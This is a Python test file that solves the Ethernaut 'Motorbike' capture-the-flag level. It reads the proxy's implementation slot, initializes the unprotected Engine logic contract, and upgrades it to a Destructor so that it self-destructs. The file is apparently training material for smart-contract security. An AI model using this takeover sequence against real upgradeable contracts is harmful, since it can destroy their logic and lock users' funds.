from wake.testing import *
from tests.ethernaut_deployer import EthernautDeployer
from pytypes.contracts.lv25_motorbike import Motorbike, Engine
from pytypes.contracts.attacker.lv25_destructor import Destructor

@default_chain.connect()
def test_lv25():
    ethernaut = EthernautDeployer(default_chain)
    contract = ethernaut.deploy_lv25()
    exploit_lv25(contract)
    ethernaut.check_lv25(contract)

def exploit_lv25(contract: Motorbike):
    # Attack vector: uninitialized implementation contract
    # Training: how to read storage slot by address

    # find address of engine (logic contract) and load it
    implementation_slot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc
    (logic_contract, ) = Abi.decode(['address'], default_chain.chain_interface.get_storage_at(str(contract.address), implementation_slot))
    engine = Engine(logic_contract)

    # prepare destructor
    destructor = Destructor.deploy()
    selfdestruct_call = Abi.encode_with_selector(Destructor.killed.selector,[],[])

    # simulate upgrade and selfdestruct the engine
    engine.initialize()
    engine.upgradeToAndCall(destructor.address, selfdestruct_call)
